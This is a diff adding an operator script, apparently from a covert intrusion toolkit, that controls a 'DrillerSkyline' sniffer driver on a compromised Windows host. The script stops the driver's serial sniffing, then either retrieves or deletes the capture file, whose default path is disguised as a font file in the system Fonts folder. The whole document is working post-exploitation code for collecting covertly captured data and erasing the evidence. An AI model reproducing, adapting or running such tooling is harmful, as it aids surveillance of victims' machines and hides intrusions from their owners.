@@ -1,0 +1,79 @@
+#--------------------------------------------------------
+# File: HandleCapture.eps
+#
+# Handle DrillerSkyline capture file
+#
+# Modifications:
+#  12/12/2006	Stole from DS
+#--------------------------------------------------------
+@include "_GetSystemPaths.epm";
+@include "Include\\DsIncludes.epm";
+
+@echo off;
+
+if (($argc < 3) || ($argc > 4)) {
+	echo "Usage: $argv[0] <driverName> <delete|get> [captureFile]";
+	return false;
+}
+
+string $driver = $argv[1];
+string $action = $argv[2];
+string $captureFile = "\\SystemRoot\\Fonts\\vga_drsk.tff";
+if ($argc >= 4) {
+	$captureFile = $argv[3];
+}
+
+if (($action != "get") && ($action != "delete")) {
+	echo "Usage: $argv[0] <driverName> <delete|get> [captureFile]";
+	return false;
+}
+
+if ($action == "delete") {
+	ifnot (prompt "Are you sure you want to delete the capture file?") {
+		return false;		
+	}
+}
+
+# convert capture file path to user-mode
+DsGetUserModePath($captureFile);
+
+string $parts = SplitPath($captureFile);
+string $path = $parts[0];
+string $file = $parts[1];
+
+echo "Stopping scanning";
+@echo on;
+if (`serialsniffer -driver $driver -stopListening`) {
+	if ($action == "get") {
+
+		echo "Getting '$path\\$file'";
+		bool $rtn = `get "$path\\$file" -foreground`;
+		if ($rtn) {
+			echo "	SUCCESS";
+		} else {
+			echo "	FAILED";
+		}
+	
+		return $rtn;
+
+	} else if ($action == "delete") {
+
+		echo "Deleting $path\\$file";
+		if (`del "$file" -path "$path"`) {
+			echo "	DELETED";
+			return true;
+		} else {
+			echo "	FAILED";
+			return false;
+		}
+
+	} else {
+		
+		echo "Unknown action ($action)";
+		return false;
+
+	}	
+}
+@echo off;
+
+return false;
